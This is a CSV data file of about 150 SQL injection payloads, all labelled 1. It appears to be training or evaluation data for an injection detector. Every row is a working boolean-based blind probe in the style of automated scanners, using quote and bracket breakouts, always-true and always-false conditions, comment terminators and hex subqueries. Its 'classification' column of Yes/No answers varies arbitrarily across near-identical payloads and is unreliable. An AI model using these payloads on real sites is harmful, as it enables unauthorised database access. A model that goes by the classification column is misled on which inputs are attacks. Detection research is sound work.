input_text,Label,classification, ,,,,,,
"1'lSDwjX<'"">xtqTjp",1,No.,,,,,,,
1) AND 2170=8897-- FUmF,1,Yes.,,,,,,,
1) AND 1947=1947-- juSM,1,Yes,,,,,,,
1') AND 5376=4067-- NlbI,1,Yes.,,,,,,,
1') AND 1947=1947-- gaZa,1,Yes.,,,,,,,
1' AND 7610=3690-- Tmgb,1,Yes.,,,,,,,
1' AND 1947=1947-- nqnZ,1,Yes,,,,,,,
1' AND 6215=9546-- sKDt,1,No.,,,,,,,
"1"" AND 1719=5861-- poIL",1,No.,,,,,,,
"1"" AND 1947=1947-- DkvM",1,Yes,,,,,,,
1) AND 5327=4261 AND (5259=5259,1,No,,,,,,,
1) AND 1947=1947 AND (8363=8363,1,No.,,,,,,,
1)) AND 5786=3656 AND ((8795=8795,1,Yes.,,,,,,,
1)) AND 1947=1947 AND ((9114=9114,1,No.,,,,,,,
1))) AND 3938=4746 AND (((5651=5651,1,Yes.,,,,,,,
1))) AND 1947=1947 AND (((4560=4560,1,Yes.,,,,,,,
1 AND 8350=7897,1,No.,,,,,,,
1 AND 1947=1947,1,No.,,,,,,,
1') AND 6106=8706 AND ('jgNf'='jgNf,1,No,,,,,,,
1') AND 1947=1947 AND ('Olgo'='Olgo,1,No,,,,,,,
1')) AND 3362=7125 AND (('Thon'='Thon,1,No,,,,,,,
1')) AND 1947=1947 AND (('gKTH'='gKTH,1,No,,,,,,,
1'))) AND 5970=6314 AND ((('chTf'='chTf,1,Yes,,,,,,,
1'))) AND 1947=1947 AND ((('oWWY'='oWWY,1,No,,,,,,,
1' AND 8392=3454 AND 'kFdZ'='kFdZ,1,No,,,,,,,
1' AND 1947=1947 AND 'uCHF'='uCHF,1,Yes.,,,,,,,
1' AND 1794=7365 AND 'TCsD'='TCsD,1,No.,,,,,,,
1') AND 6578=1114 AND ('cIMN' LIKE 'cIMN,1,No,,,,,,,
1') AND 1947=1947 AND ('RPcv' LIKE 'RPcv,1,No,,,,,,,
1')) AND 2048=1547 AND (('BGTQ' LIKE 'BGTQ,1,No,,,,,,,
1')) AND 1947=1947 AND (('WdIw' LIKE 'WdIw,1,No,,,,,,,
1'))) AND 7306=6193 AND ((('Tamm' LIKE 'Tamm,1,No,,,,,,,
1'))) AND 1947=1947 AND ((('PHjB' LIKE 'PHjB,1,No.,,,,,,,
1%' AND 5769=6811 AND 'vHFJ%'='vHFJ,1,No,,,,,,,
1%' AND 1947=1947 AND 'tloF%'='tloF,1,Yes.,,,,,,,
1' AND 4876=2970 AND 'lwbc' LIKE 'lwbc,1,Yes,,,,,,,
1' AND 1947=1947 AND 'PczQ' LIKE 'PczQ,1,Yes,,,,,,,
1' AND 4686=7399 AND 'eMCB' LIKE 'eMCB,1,No.,,,,,,,
"1"") AND 6836=9093 AND (""Cvss""=""Cvss",1,No.,,,,,,,
"1"") AND 1947=1947 AND (""gXkp""=""gXkp",1,No.,,,,,,,
"1"")) AND 7521=5807 AND ((""REDv""=""REDv",1,No.,,,,,,,
"1"")) AND 1947=1947 AND ((""qggc""=""qggc",1,No.,,,,,,,
"1""))) AND 9883=3053 AND (((""PrAg""=""PrAg",1,No.,,,,,,,
"1""))) AND 1947=1947 AND (((""ohtp""=""ohtp",1,No.,,,,,,,
"1"" AND 2437=8559 AND ""qtqu""=""qtqu",1,No.,,,,,,,
"1"" AND 1947=1947 AND ""SDpg""=""SDpg",1,No.,,,,,,,
"1"") AND 7656=5892 AND (""yQqQ"" LIKE ""yQqQ",1,No,,,,,,,
"1"") AND 1947=1947 AND (""GoeT"" LIKE ""GoeT",1,No,,,,,,,
"1"")) AND 2623=8546 AND ((""Scqe"" LIKE ""Scqe",1,No.,,,,,,,
"1"")) AND 1947=1947 AND ((""GJHN"" LIKE ""GJHN",1,No,,,,,,,
"1""))) AND 2065=2693 AND (((""WCpe"" LIKE ""WCpe",1,No,,,,,,,
"1""))) AND 1947=1947 AND (((""LIRD"" LIKE ""LIRD",1,No,,,,,,,
"1"" AND 7910=3352 AND ""yalb"" LIKE ""yalb",1,No,,,,,,,
"1"" AND 1947=1947 AND ""UeEI"" LIKE ""UeEI",1,No,,,,,,,
1 AND 4802=1575-- HJXM,1,Yes.,,,,,,,
1 AND 1947=1947-- iLVi,1,Yes.,,,,,,,
1 AND 2990=5024# LjWM,1,No.,,,,,,,
1 AND 1947=1947# teYO,1,No.,,,,,,,
1' AND 2179=3424 OR 'PQQd'='nTZC,1,No.,,,,,,,
1' AND 1947=1947 OR 'uvZh'='plbp,1,No.,,,,,,,
1' AND 6160=5237 OR 'VFFB'='PFzk,1,Yes.,,,,,,,
1') WHERE 7620=7620 AND 3092=6701-- imlg,1,Yes.,,,,,,,
1') WHERE 2926=2926 AND 1947=1947-- VlUX,1,No.,,,,,,,
"1"") WHERE 9269=9269 AND 6982=8750-- Rmej",1,Yes.,,,,,,,
"1"") WHERE 4205=4205 AND 1947=1947-- Uidc",1,Yes.,,,,,,,
1) WHERE 4465=4465 AND 5757=6626-- wrkp,1,No.,,,,,,,
1) WHERE 4611=4611 AND 1947=1947-- teIX,1,No.,,,,,,,
1' WHERE 5472=5472 AND 3543=1480-- dgWH,1,Yes.,,,,,,,
1' WHERE 5923=5923 AND 1947=1947-- YOKL,1,No.,,,,,,,
"1"" WHERE 5839=5839 AND 5096=8712-- lUBN",1,No.,,,,,,,
"1"" WHERE 7668=7668 AND 1947=1947-- OyTS",1,No.,,,,,,,
1 WHERE 5269=5269 AND 4046=2002-- EJnE,1,No.,,,,,,,
1 WHERE 7095=7095 AND 1947=1947-- paoD,1,No.,,,,,,,
1'||(SELECT 0x636a5148 WHERE 6960=6960 AND 7414=3128)||',1,Yes.,,,,,,,
1'||(SELECT 0x55427761 WHERE 3487=3487 AND 1947=1947)||',1,Yes.,,,,,,,
1'||(SELECT 0x54667255 FROM DUAL WHERE 2342=2342 AND 3229=5539)||',1,No.,,,,,,,
1'||(SELECT 0x4169526c FROM DUAL WHERE 4993=4993 AND 1947=1947)||',1,Yes,,,,,,,
1'+(SELECT 0x716c7159 WHERE 8714=8714 AND 3829=1574)+',1,No.,,,,,,,
1'+(SELECT 0x74525a48 WHERE 5363=5363 AND 1947=1947)+',1,Yes.,,,,,,,
1||(SELECT 0x614c6676 FROM DUAL WHERE 6898=6898 AND 6486=6635)||,1,No.,,,,,,,
1||(SELECT 0x4e6b4d76 FROM DUAL WHERE 2619=2619 AND 1947=1947)||,1,Yes.,,,,,,,
1||(SELECT 0x48455742 WHERE 9731=9731 AND 3209=6071)||,1,Yes,,,,,,,
1||(SELECT 0x6646577a WHERE 2623=2623 AND 1947=1947)||,1,Yes.,,,,,,,
1+(SELECT nhFc WHERE 3163=3163 AND 4263=3396)+,1,Yes.,,,,,,,
1+(SELECT RNFP WHERE 4041=4041 AND 1947=1947)+,1,Yes.,,,,,,,
1+(SELECT 0x726d6c77 WHERE 5445=5445 AND 7283=6887)+,1,No.,,,,,,,
1+(SELECT 0x6c494848 WHERE 9084=9084 AND 1947=1947)+,1,Yes.,,,,,,,
1')) AS qArU WHERE 7650=7650 AND 3152=6342-- zFAS,1,No.,,,,,,,
1')) AS DOTa WHERE 7137=7137 AND 1947=1947-- xlqO,1,No.,,,,,,,
"1"")) AS jAdx WHERE 9540=9540 AND 5924=9850-- oMaQ",1,No.,,,,,,,
"1"")) AS LMHo WHERE 9959=9959 AND 1947=1947-- VzwB",1,Yes.,,,,,,,
1)) AS CSkI WHERE 6225=6225 AND 3119=4366-- iegi,1,No,,,,,,,
1)) AS hnak WHERE 9546=9546 AND 1947=1947-- odfe,1,No.,,,,,,,
1') AS SbTO WHERE 4541=4541 AND 3466=9675-- Whsa,1,No.,,,,,,,
1') AS mCPl WHERE 2858=2858 AND 1947=1947-- mdne,1,Yes.,,,,,,,
"1"") AS rPjB WHERE 7515=7515 AND 3156=1335-- RFmy",1,No.,,,,,,,
"1"") AS iwhx WHERE 9790=9790 AND 1947=1947-- NCQD",1,No.,,,,,,,
1) AS XRLr WHERE 5162=5162 AND 9599=7789-- EATW,1,No.,,,,,,,
1) AS YwqW WHERE 8535=8535 AND 1947=1947-- KOCp,1,No.,,,,,,,
1` WHERE 2907=2907 AND 3207=5746-- ddWg,1,No.,,,,,,,
1` WHERE 3678=3678 AND 1947=1947-- CkTg,1,Yes.,,,,,,,
1`) WHERE 9892=9892 AND 8772=5601-- ezwe,1,No.,,,,,,,
1`) WHERE 3636=3636 AND 1947=1947-- eUZb,1,No.,,,,,,,
1`=`1` AND 4414=9446 AND `1`=`1,1,No.,,,,,,,
1`=`1` AND 1947=1947 AND `1`=`1,1,Yes.,,,,,,,
"1""=""1"" AND 4061=1230 AND ""1""=""1",1,Yes.,,,,,,,
"1""=""1"" AND 1947=1947 AND ""1""=""1",1,Yes,,,,,,,
1]-(SELECT 0 WHERE 7566=7566 AND 7408=4410)|[1,1,No,,,,,,,
1]-(SELECT 0 WHERE 8051=8051 AND 1947=1947)|[1,1,No.,,,,,,,
1' IN BOOLEAN MODE) AND 4349=3541#,1,No.,,,,,,,
1' IN BOOLEAN MODE) AND 1947=1947#,1,No,,,,,,,
-5484,1,No,,,,,,,
-3946) OR 3302=3877-- LSiS,1,Yes,,,,,,,
-6378) OR 7464=7464-- GsUG,1,Yes,,,,,,,
-5145') OR 4138=2617-- QusF,1,No.,,,,,,,
-3095') OR 7464=7464-- ZDfc,1,Yes.,,,,,,,
-1008' OR 4498=8234-- YNwy,1,Yes.,,,,,,,
-8283' OR 7464=7464-- iweI,1,Yes.,,,,,,,
-6865' OR 1234=5427-- NMpu,1,No.,,,,,,,
-3260' iVXfDqhCzN-- MHbA,1,No.,,,,,,,
"-3244"" OR 4024=5309-- vviw",1,No.,,,,,,,
"-4060"" OR 7464=7464-- IJkT",1,Yes.,,,,,,,
-3938) OR 4108=1435 AND (1123=1123,1,No,,,,,,,
-6459) OR 7464=7464 AND (1621=1621,1,Yes.,,,,,,,
-8955)) OR 9997=1129 AND ((7450=7450,1,No,,,,,,,
-7290)) OR 7464=7464 AND ((8231=8231,1,Yes.,,,,,,,
-1031))) OR 4751=2015 AND (((7064=7064,1,No,,,,,,,
-4280))) OR 7464=7464 AND (((8426=8426,1,Yes,,,,,,,
-1810 OR 2392=3975,1,No.,,,,,,,
-1258 OR 7464=7464,1,Yes,,,,,,,
-9468') OR 3325=4787 AND ('XxzT'='XxzT,1,No,,,,,,,
-8024') OR 7464=7464 AND ('sHYl'='sHYl,1,No,,,,,,,
-2057')) OR 6541=4504 AND (('QzUo'='QzUo,1,Yes,,,,,,,
-9067')) OR 7464=7464 AND (('IIvh'='IIvh,1,Yes,,,,,,,
-4494'))) OR 6049=9576 AND ((('hrNJ'='hrNJ,1,No.,,,,,,,
-4958'))) OR 7464=7464 AND ((('hBou'='hBou,1,Yes,,,,,,,
-8512' OR 3922=4045 AND 'NIMn'='NIMn,1,No.,,,,,,,
-5058' OR 7464=7464 AND 'QqIS'='QqIS,1,Yes.,,,,,,,
-8327' OR 7826=6318 AND 'qGfg'='qGfg,1,No.,,,,,,,
-7296' iVXfDqhCzN AND 'TlJj'='TlJj,1,No,,,,,,,
